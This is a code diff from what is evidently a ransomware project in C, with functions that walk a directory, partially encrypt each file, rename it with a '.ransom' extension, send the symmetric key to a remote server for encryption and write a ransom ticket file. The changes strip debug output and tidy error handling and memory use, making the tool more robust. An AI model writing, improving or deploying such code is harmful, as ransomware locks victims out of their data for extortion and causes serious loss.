@@ -38,7 +38,7 @@ int encryptSymmetricKey(char **encrypted_key, const int pubkeyid,
 	strcat(url, "&symkey=");
 	strcat(url, hexkey);
 	strcat(url, "\0");
-	printf("URL: %s\n", url);
+
 	//Get encrypted key
 	int ret = decryptRemoteBytes(encrypted_key, url);
 
@@ -99,22 +99,38 @@ bool partialEncryptFile(const char *keyiv, const char *filename,
 bool decryptDirectory(const char *keyiv, const char *directory)
 {
 	char **ls = walkDir(directory);
-	char *sub = (char *) malloc(100);
+	char *sub = (char *) malloc(1);
 	for (int i = 0; strcmp(ls[i], "\0"); i++) {
+
 		//Check for files with ".ransom" file extension
 		if (strrchr(ls[i], '.') != NULL
 		    && !strcmp(strrchr(ls[i], '.'), RANSOM_EXTENSION)) {
+
 			//Decrypt file
 			if (partialEncryptFile
 			    (keyiv, ls[i], MAX_BYTES_TO_ENCRYPT, 1)) {
+
 				//Remove ".ransom" file extension
-				strncpy(sub, ls[i],
-					strlen(ls[i]) -
-					strlen(strrchr(ls[i], '.')));
-				sub[strlen(ls[i]) -
-				    strlen(strrchr(ls[i], '.'))] = '\0';
-				printf("\t:%s\n", sub);
-				rename(ls[i], sub);
+				char *temp = realloc(sub, strlen(ls[i]));
+				if (temp != NULL) {
+					sub = temp;
+					strncpy(sub, ls[i],
+						strlen(ls[i]) -
+						strlen(strrchr
+						       (ls[i], '.')));
+					sub[strlen(ls[i]) -
+					    strlen(strrchr(ls[i], '.'))] =
+					    '\0';
+					if (rename(ls[i], sub)) {
+						printf
+						    ("Warning: decryptDirectory: renaming failed(%s)\n",
+						     ls[i]);
+					};
+				} else {
+					printf
+					    ("Warning: decryptDirectory: issue allocating memory to sub\n");
+
+				}
 			};
 		}
 	}
@@ -141,18 +157,22 @@ bool encryptDirectory(const char *keyiv, const char *directory)
 	char *newfname;
 	for (int i = 0; strcmp(ls[i], "\0"); i++) {
 		//Partial encrypt ls[i]
-		printf("%d\n",
-		       partialEncryptFile(keyiv, ls[i],
-					  MAX_BYTES_TO_ENCRYPT, 0));
-
+		if (!partialEncryptFile(keyiv, ls[i],
+					MAX_BYTES_TO_ENCRYPT, 0)) {
+			printf
+			    ("Warning: encryptDirectory: partialEncryptFile failed\n");
+		}
 		//Append '.ransom' to filename
 		newfname =
 		    (char *) malloc(strlen(ls[i]) +
 				    strlen(RANSOM_EXTENSION) + 1);
 		strcpy(newfname, ls[i]);
 		strcat(newfname, RANSOM_EXTENSION);
-		if (rename(ls[i], newfname))
-			printf("Renaming failed\n");
+		if (rename(ls[i], newfname)) {
+			printf
+			    ("Warning: encryptDirectory: Renaming failed(%s)\n",
+			     ls[i]);
+		}
 	}
 
 
@@ -170,21 +190,15 @@ bool encryptDirectory(const char *keyiv, const char *directory)
 	return 1;
 }
 
-bool makeTicket(char **keyiv, const char *directory)
+bool makeTicket(const char *keyiv, const char *directory)
 {
 	//Get key id
 	int keyid = ASYMMETRIC_KEY_ID;
 
-	//Generate key+iv
-	if (!secureRand(keyiv, SYMMETRIC_KEY_SIZE + SYMMETRIC_IV_SIZE)) {
-		fprintf(stderr,
-			"Error: makeTicket: failed to generate keyiv");
-		return 0;
-	}
 	//Encrypt keyiv
 	char *encrypted_key;
 	int encrypted_key_size =
-	    encryptSymmetricKey(&encrypted_key, keyid, *keyiv);
+	    encryptSymmetricKey(&encrypted_key, keyid, keyiv);
 
 	//Make raw ticket
 	char *raw_ticket = (char *) malloc(2 + encrypted_key_size);
@@ -194,10 +208,8 @@ bool makeTicket(char **keyiv, const char *directory)
 		raw_ticket[i + 2] = encrypted_key[i];
 
 	//Make hex ticket
-	printf("Encrypted_key %s\n", encrypted_key);
 	char *ticket = b16encode(raw_ticket, 2 + encrypted_key_size);
 	int ticket_size = (2 + encrypted_key_size) * 2;
-	printf("Ticket: %s\n", ticket);
 
 
 	//Prepare ticket path
@@ -210,7 +222,7 @@ bool makeTicket(char **keyiv, const char *directory)
 
 	//Write ticket to file
 	//NOTE - Need to do error handling here
-	FILE *ticket_fp = fopen(TICKET_FILENAME, "wb");
+	FILE *ticket_fp = fopen(ticket_path, "wb");
 	fwrite(ticket, 1, ticket_size, ticket_fp);
 	fclose(ticket_fp);
 
